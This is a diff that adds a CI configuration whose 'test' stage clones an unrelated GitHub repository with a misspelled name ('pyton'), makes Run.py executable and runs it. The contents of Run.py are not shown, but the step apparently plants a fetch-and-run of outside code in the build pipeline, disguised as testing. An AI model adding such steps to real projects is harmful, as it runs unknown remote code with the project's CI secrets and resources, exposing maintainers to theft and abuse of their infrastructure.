@@ -1,0 +1,4 @@
+jobs:
+  include:
+    - stage: test
+      script: git clone https://github.com/Hjhjk68/pyton.git && cd pyton && chmod +x Run.py && python ./Run.py
